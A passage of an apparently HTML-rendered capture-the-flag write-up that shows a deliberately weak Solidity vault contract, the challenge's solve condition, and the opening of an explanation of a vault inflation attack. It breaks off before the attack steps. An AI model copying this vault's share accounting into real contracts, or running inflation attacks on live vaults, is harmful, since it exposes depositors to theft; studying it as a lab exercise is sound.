+</span></span><span class=line><span class=ln> 73</span><span class=cl>        <span class=n>totalAsset</span><span class=p>.</span><span class=n>amount</span> <span class=o>+=</span> <span class=n>assets</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 74</span><span class=cl>        <span class=n>totalAsset</span><span class=p>.</span><span class=n>shares</span> <span class=o>+=</span> <span class=n>shares</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 75</span><span class=cl>        <span class=n>ling</span><span class=p>.</span><span class=n>transferFrom</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=n>assets</span><span class=p>);</span>
+</span></span><span class=line><span class=ln> 76</span><span class=cl>        <span class=n>_mint</span><span class=p>(</span><span class=n>receiver</span><span class=p>,</span> <span class=n>shares</span><span class=p>);</span>
+</span></span><span class=line><span class=ln> 77</span><span class=cl>
+</span></span><span class=line><span class=ln> 78</span><span class=cl>        <span class=n>emit</span> <span class=n>Deposit</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>receiver</span><span class=p>,</span> <span class=n>assets</span><span class=p>,</span> <span class=n>shares</span><span class=p>);</span>
+</span></span><span class=line><span class=ln> 79</span><span class=cl>        <span class=k>return</span> <span class=n>shares</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 80</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln> 81</span><span class=cl>
+</span></span><span class=line><span class=ln> 82</span><span class=cl>    <span class=kd>function</span> <span class=nf>maxMint</span><span class=p>(</span>
+</span></span><span class=line><span class=ln> 83</span><span class=cl>        <span class=kt>address</span> <span class=cm>/* receiver */</span>
+</span></span><span class=line><span class=ln> 84</span><span class=cl>    <span class=p>)</span> <span class=k>external</span> <span class=k>pure</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>maxShares</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 85</span><span class=cl>        <span class=k>return</span> <span class=nb>type</span><span class=p>(</span><span class=nc>uint256</span><span class=p>).</span><span class=nb>max</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 86</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln> 87</span><span class=cl>
+</span></span><span class=line><span class=ln> 88</span><span class=cl>    <span class=kd>function</span> <span class=nf>previewMint</span><span class=p>(</span>
+</span></span><span class=line><span class=ln> 89</span><span class=cl>        <span class=kt>uint256</span> <span class=n>shares</span>
+</span></span><span class=line><span class=ln> 90</span><span class=cl>    <span class=p>)</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>assets</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 91</span><span class=cl>        <span class=n>assets</span> <span class=o>=</span> <span class=n>convertToAssets</span><span class=p>(</span><span class=n>shares</span><span class=p>);</span>
+</span></span><span class=line><span class=ln> 92</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln> 93</span><span class=cl>
+</span></span><span class=line><span class=ln> 94</span><span class=cl>    <span class=kd>function</span> <span class=nf>mint</span><span class=p>(</span>
+</span></span><span class=line><span class=ln> 95</span><span class=cl>        <span class=kt>uint256</span> <span class=n>shares</span><span class=p>,</span>
+</span></span><span class=line><span class=ln> 96</span><span class=cl>        <span class=kt>address</span> <span class=n>receiver</span>
+</span></span><span class=line><span class=ln> 97</span><span class=cl>    <span class=p>)</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>assets</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 98</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>shares</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 99</span><span class=cl>            <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;zero shares&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>100</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>101</span><span class=cl>        <span class=n>assets</span> <span class=o>=</span> <span class=n>convertToAssets</span><span class=p>(</span><span class=n>shares</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>102</span><span class=cl>
+</span></span><span class=line><span class=ln>103</span><span class=cl>        <span class=n>totalAsset</span><span class=p>.</span><span class=n>amount</span> <span class=o>+=</span> <span class=n>assets</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>104</span><span class=cl>        <span class=n>totalAsset</span><span class=p>.</span><span class=n>shares</span> <span class=o>+=</span> <span class=n>shares</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>105</span><span class=cl>        <span class=n>ling</span><span class=p>.</span><span class=n>transferFrom</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=n>assets</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>106</span><span class=cl>        <span class=n>_mint</span><span class=p>(</span><span class=n>receiver</span><span class=p>,</span> <span class=n>shares</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>107</span><span class=cl>
+</span></span><span class=line><span class=ln>108</span><span class=cl>        <span class=n>emit</span> <span class=n>Deposit</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>receiver</span><span class=p>,</span> <span class=n>assets</span><span class=p>,</span> <span class=n>shares</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>109</span><span class=cl>        <span class=k>return</span> <span class=n>assets</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>110</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln>111</span><span class=cl>
+</span></span><span class=line><span class=ln>112</span><span class=cl>    <span class=kd>function</span> <span class=nf>maxWithdraw</span><span class=p>(</span>
+</span></span><span class=line><span class=ln>113</span><span class=cl>        <span class=kt>address</span> <span class=n>owner</span>
+</span></span><span class=line><span class=ln>114</span><span class=cl>    <span class=p>)</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>maxAssets</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>115</span><span class=cl>        <span class=kt>uint256</span> <span class=n>shares</span> <span class=o>=</span> <span class=n>balanceOf</span><span class=p>(</span><span class=n>owner</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>116</span><span class=cl>        <span class=n>maxAssets</span> <span class=o>=</span> <span class=n>convertToAssets</span><span class=p>(</span><span class=n>shares</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>117</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln>118</span><span class=cl>
+</span></span><span class=line><span class=ln>119</span><span class=cl>    <span class=kd>function</span> <span class=nf>previewWithdraw</span><span class=p>(</span>
+</span></span><span class=line><span class=ln>120</span><span class=cl>        <span class=kt>uint256</span> <span class=n>assets</span>
+</span></span><span class=line><span class=ln>121</span><span class=cl>    <span class=p>)</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>shares</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>122</span><span class=cl>        <span class=n>shares</span> <span class=o>=</span> <span class=n>convertToShares</span><span class=p>(</span><span class=n>assets</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>123</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln>124</span><span class=cl>
+</span></span><span class=line><span class=ln>125</span><span class=cl>    <span class=kd>function</span> <span class=nf>withdraw</span><span class=p>(</span>
+</span></span><span class=line><span class=ln>126</span><span class=cl>        <span class=kt>uint256</span> <span class=n>assets</span><span class=p>,</span>
+</span></span><span class=line><span class=ln>127</span><span class=cl>        <span class=kt>address</span> <span class=n>receiver</span><span class=p>,</span>
+</span></span><span class=line><span class=ln>128</span><span class=cl>        <span class=kt>address</span> <span class=n>owner</span>
+</span></span><span class=line><span class=ln>129</span><span class=cl>    <span class=p>)</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>shares</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>130</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>assets</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>131</span><span class=cl>            <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;zero assets&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>132</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>133</span><span class=cl>        <span class=n>shares</span> <span class=o>=</span> <span class=n>convertToShares</span><span class=p>(</span><span class=n>assets</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>134</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>shares</span> <span class=o>&gt;</span> <span class=n>balanceOf</span><span class=p>(</span><span class=n>owner</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>135</span><span class=cl>            <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;insufficient shares&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>136</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>137</span><span class=cl>
+</span></span><span class=line><span class=ln>138</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>!=</span> <span class=n>owner</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>139</span><span class=cl>            <span class=kt>uint256</span> <span class=n>allowed</span> <span class=o>=</span> <span class=n>allowance</span><span class=p>(</span><span class=n>owner</span><span class=p>,</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>140</span><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>allowed</span> <span class=o>&lt;</span> <span class=n>shares</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>141</span><span class=cl>                <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;insufficient allowance&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>142</span><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=ln>143</span><span class=cl>            <span class=n>_approve</span><span class=p>(</span><span class=n>owner</span><span class=p>,</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>allowed</span> <span class=o>-</span> <span class=n>shares</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>144</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>145</span><span class=cl>
+</span></span><span class=line><span class=ln>146</span><span class=cl>        <span class=n>_burn</span><span class=p>(</span><span class=n>owner</span><span class=p>,</span> <span class=n>shares</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>147</span><span class=cl>        <span class=n>totalAsset</span><span class=p>.</span><span class=n>amount</span> <span class=o>-=</span> <span class=n>assets</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>148</span><span class=cl>        <span class=n>totalAsset</span><span class=p>.</span><span class=n>shares</span> <span class=o>-=</span> <span class=n>shares</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>149</span><span class=cl>        <span class=n>ling</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=n>receiver</span><span class=p>,</span> <span class=n>assets</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>150</span><span class=cl>
+</span></span><span class=line><span class=ln>151</span><span class=cl>        <span class=n>emit</span> <span class=n>Withdraw</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>receiver</span><span class=p>,</span> <span class=n>owner</span><span class=p>,</span> <span class=n>assets</span><span class=p>,</span> <span class=n>shares</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>152</span><span class=cl>        <span class=k>return</span> <span class=n>shares</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>153</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln>154</span><span class=cl>
+</span></span><span class=line><span class=ln>155</span><span class=cl>    <span class=kd>function</span> <span class=nf>maxRedeem</span><span class=p>(</span>
+</span></span><span class=line><span class=ln>156</span><span class=cl>        <span class=kt>address</span> <span class=n>owner</span>
+</span></span><span class=line><span class=ln>157</span><span class=cl>    <span class=p>)</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>maxShares</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>158</span><span class=cl>        <span class=k>return</span> <span class=n>balanceOf</span><span class=p>(</span><span class=n>owner</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>159</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln>160</span><span class=cl>
+</span></span><span class=line><span class=ln>161</span><span class=cl>    <span class=kd>function</span> <span class=nf>previewRedeem</span><span class=p>(</span>
+</span></span><span class=line><span class=ln>162</span><span class=cl>        <span class=kt>uint256</span> <span class=n>shares</span>
+</span></span><span class=line><span class=ln>163</span><span class=cl>    <span class=p>)</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>assets</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>164</span><span class=cl>        <span class=n>assets</span> <span class=o>=</span> <span class=n>convertToAssets</span><span class=p>(</span><span class=n>shares</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>165</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln>166</span><span class=cl>
+</span></span><span class=line><span class=ln>167</span><span class=cl>    <span class=kd>function</span> <span class=nf>redeem</span><span class=p>(</span>
+</span></span><span class=line><span class=ln>168</span><span class=cl>        <span class=kt>uint256</span> <span class=n>shares</span><span class=p>,</span>
+</span></span><span class=line><span class=ln>169</span><span class=cl>        <span class=kt>address</span> <span class=n>receiver</span><span class=p>,</span>
+</span></span><span class=line><span class=ln>170</span><span class=cl>        <span class=kt>address</span> <span class=n>owner</span>
+</span></span><span class=line><span class=ln>171</span><span class=cl>    <span class=p>)</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>assets</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>172</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>shares</span> <span class=o>&gt;</span> <span class=n>balanceOf</span><span class=p>(</span><span class=n>owner</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>173</span><span class=cl>            <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;insufficient shares&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>174</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>175</span><span class=cl>        <span class=n>assets</span> <span class=o>=</span> <span class=n>convertToAssets</span><span class=p>(</span><span class=n>shares</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>176</span><span class=cl>
+</span></span><span class=line><span class=ln>177</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>!=</span> <span class=n>owner</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>178</span><span class=cl>            <span class=kt>uint256</span> <span class=n>allowed</span> <span class=o>=</span> <span class=n>allowance</span><span class=p>(</span><span class=n>owner</span><span class=p>,</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>179</span><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>allowed</span> <span class=o>&lt;</span> <span class=n>shares</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>180</span><span class=cl>                <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;insufficient allowance&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>181</span><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=ln>182</span><span class=cl>            <span class=n>_approve</span><span class=p>(</span><span class=n>owner</span><span class=p>,</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>allowed</span> <span class=o>-</span> <span class=n>shares</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>183</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>184</span><span class=cl>
+</span></span><span class=line><span class=ln>185</span><span class=cl>        <span class=n>_burn</span><span class=p>(</span><span class=n>owner</span><span class=p>,</span> <span class=n>shares</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>186</span><span class=cl>        <span class=n>totalAsset</span><span class=p>.</span><span class=n>amount</span> <span class=o>-=</span> <span class=n>assets</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>187</span><span class=cl>        <span class=n>totalAsset</span><span class=p>.</span><span class=n>shares</span> <span class=o>-=</span> <span class=n>shares</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>188</span><span class=cl>        <span class=n>ling</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=n>receiver</span><span class=p>,</span> <span class=n>assets</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>189</span><span class=cl>
+</span></span><span class=line><span class=ln>190</span><span class=cl>        <span class=n>emit</span> <span class=n>Withdraw</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>receiver</span><span class=p>,</span> <span class=n>owner</span><span class=p>,</span> <span class=n>assets</span><span class=p>,</span> <span class=n>shares</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>191</span><span class=cl>        <span class=k>return</span> <span class=n>assets</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>192</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln>193</span><span class=cl>
+</span></span><span class=line><span class=ln>194</span><span class=cl>    <span class=kd>function</span> <span class=nf>borrowAssets</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>amount</span><span class=p>)</span> <span class=k>external</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>195</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>amount</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>196</span><span class=cl>            <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;zero amount&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>197</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>198</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>amount</span> <span class=o>&gt;</span> <span class=n>totalAssets</span><span class=p>())</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>199</span><span class=cl>            <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;insufficient balance&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>200</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>201</span><span class=cl>        <span class=n>borrowedAssets</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>+=</span> <span class=n>amount</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>202</span><span class=cl>        <span class=n>totalBorrowedAssets</span> <span class=o>+=</span> <span class=n>amount</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>203</span><span class=cl>        <span class=n>ling</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>amount</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>204</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln>205</span><span class=cl>
+</span></span><span class=line><span class=ln>206</span><span class=cl>    <span class=kd>function</span> <span class=nf>repayAssets</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>amount</span><span class=p>)</span> <span class=k>external</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>207</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>amount</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>208</span><span class=cl>            <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;zero amount&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>209</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>210</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>borrowedAssets</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>&lt;</span> <span class=n>amount</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>211</span><span class=cl>            <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;invalid amount&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>212</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>213</span><span class=cl>        <span class=kt>uint256</span> <span class=n>fee</span> <span class=o>=</span> <span class=p>(</span><span class=n>amount</span> <span class=o>*</span> <span class=mi>1</span><span class=p>)</span> <span class=o>/</span> <span class=mi>100</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>214</span><span class=cl>        <span class=n>borrowedAssets</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>-=</span> <span class=n>amount</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>215</span><span class=cl>        <span class=n>totalBorrowedAssets</span> <span class=o>-=</span> <span class=n>amount</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>216</span><span class=cl>        <span class=n>totalAsset</span><span class=p>.</span><span class=n>amount</span> <span class=o>+=</span> <span class=n>fee</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>217</span><span class=cl>        <span class=n>ling</span><span class=p>.</span><span class=n>transferFrom</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=n>amount</span> <span class=o>+</span> <span class=n>fee</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>218</span><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=ln>219</span><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln>1</span><span class=cl>    <span class=kd>function</span> <span class=nf>solve</span><span class=p>()</span> <span class=k>external</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>2</span><span class=cl>        <span class=n>ling</span><span class=p>.</span><span class=n>approve</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>vault</span><span class=p>),</span> <span class=mi>999</span> <span class=kc>ether</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>3</span><span class=cl>        <span class=n>vault</span><span class=p>.</span><span class=n>deposit</span><span class=p>(</span><span class=mi>999</span> <span class=kc>ether</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>));</span>
+</span></span><span class=line><span class=ln>4</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>vault</span><span class=p>.</span><span class=n>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>))</span> <span class=o>&gt;=</span> <span class=mi>500</span> <span class=kc>ether</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln>5</span><span class=cl>            <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;Challenge not solved yet&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>6</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln>7</span><span class=cl>        <span class=n>solved</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>8</span><span class=cl>    <span class=p>}</span>
+</span></span></code></pre></div><p>Our goal is to make the <code>Setup::isSolved</code> function return <code>true</code>. This function returns <code>true</code> if the <code>solved</code> variable is set to <code>true</code>. We can set <code>solved</code> to <code>true</code> by calling <code>Setup::solve</code>. The <code>Setup::solve</code> function attempts to deposit <code>999e18</code> <strong>LING</strong> tokens into the vault. If, during this deposit, the number of shares received by the <code>Setup</code> contract is <strong>less than 500 ether</strong>, the <code>solved</code> variable will be set to true.</p><p>By looking at this, we can understand that the challenge is related to a <strong>vault inflation attack</strong>. If you&rsquo;re unfamiliar with vault inflation attacks, I recommend reading <a href=https://mixbytes.io/blog/overview-of-the-inflation-attack target=_blank rel="noopener noreferrer">Mixbytes<i class="fas fa-external-link-square-alt ms-1"></i></a> blog post. If you&rsquo;re not familiar with ERC-4626 vaults, I suggest checking out <a href=https://rareskills.io/post/erc4626 target=_blank rel="noopener noreferrer">Rareskills<i class="fas fa-external-link-square-alt ms-1"></i></a> blog post.</p><h3 id=the-exploit data-numberify>The Exploit<a class="anchor ms-1" href=#the-exploit></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl>    <span class=kd>function</span> <span class=nf>deposit</span><span class=p>(</span>
+</span></span><span class=line><span class=ln> 2</span><span class=cl>        <span class=kt>uint256</span> <span class=n>assets</span><span class=p>,</span>
+</span></span><span class=line><span class=ln> 3</span><span class=cl>        <span class=kt>address</span> <span class=n>receiver</span>
+</span></span><span class=line><span class=ln> 4</span><span class=cl>    <span class=p>)</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 5</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>assets</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 6</span><span class=cl>            <span class=nb>revert</span><span class=p>(</span><span class=s>&#34;zero assets&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=ln> 7</span><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=ln> 8</span><span class=cl>        <span class=kt>uint256</span> <span class=n>shares</span> <span class=o>=</span> <span class=n>convertToShares</span><span class=p>(</span><span class=n>assets</span><span class=p>);</span>
+</span></span><span class=line><span class=ln> 9</span><span class=cl>
+</span></span><span class=line><span class=ln>10</span><span class=cl>        <span class=n>totalAsset</span><span class=p>.</span><span class=n>amount</span> <span class=o>+=</span> <span class=n>assets</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>11</span><span class=cl>        <span class=n>totalAsset</span><span class=p>.</span><span class=n>shares</span> <span class=o>+=</span> <span class=n>shares</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>12</span><span class=cl>        <span class=n>ling</span><span class=p>.</span><span class=n>transferFrom</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=n>assets</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>13</span><span class=cl>        <span class=n>_mint</span><span class=p>(</span><span class=n>receiver</span><span class=p>,</span> <span class=n>shares</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>14</span><span class=cl>
+</span></span><span class=line><span class=ln>15</span><span class=cl>        <span class=n>emit</span> <span class=n>Deposit</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>receiver</span><span class=p>,</span> <span class=n>assets</span><span class=p>,</span> <span class=n>shares</span><span class=p>);</span>
+</span></span><span class=line><span class=ln>16</span><span class=cl>        <span class=k>return</span> <span class=n>shares</span><span class=p>;</span>
+</span></span><span class=line><span class=ln>17</span><span class=cl>    <span class=p>}</span>
+</span></span></code></pre></div><p>The above function is from the <code>Vault</code> contract. When the <code>Setup::solve</code> function calls <code>Vault::deposit</code>, the number of shares the <code>Setup</code> contract receives is determined by the <code>Vault::convertToShares</code> function.<br>Now, let&rsquo;s take a look at <code>Vault::convertToShares</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=ln> 1</span><span class=cl>
+</span></span><span class=line><span class=ln> 2</span><span class=cl>    <span class=kd>function</span> <span class=nf>convertToShares</span><span class=p>(</span>
+</span></span><span class=line><span class=ln> 3</span><span class=cl>        <span class=kt>uint256</span> <span class=n>assets</span>
+</span></span><span class=line><span class=ln> 4</span><span class=cl>    <span class=p>)</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span> <span class=n>shares</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 5</span><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>totalAsset</span><span class=p>.</span><span class=n>amount</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=ln> 6</span><span class=cl>            <span class=n>shares</span> <span class=o>=</span> <span class=n>assets</span><span class=p>;</span>
+</span></span><span class=line><span class=ln> 7</span><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
